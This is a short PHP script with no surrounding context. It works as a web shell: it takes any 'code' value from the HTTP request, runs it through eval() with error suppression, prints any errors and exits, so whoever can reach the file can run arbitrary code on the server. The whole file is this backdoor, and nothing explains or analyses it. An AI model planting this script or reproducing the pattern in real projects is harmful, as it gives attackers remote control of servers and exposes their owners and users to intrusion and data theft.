<?php
function any($x,$y)
{
	return array_key_exists($x,$y);
}

function Evil($x,$y=false)
{
	$c=$y==true?"?>".$x."<?php ":$x;
	$evil=@eval($c);
	if(error_get_last())
	{
		print "\n[Error] ";
	    return print_r(error_get_last());
	}
	return $evil;
}

if(any("code",$_REQUEST))
{
	ob_clean();
	$code=trim($_REQUEST['code']);
	$evil=Evil($code);
	exit;
}

?>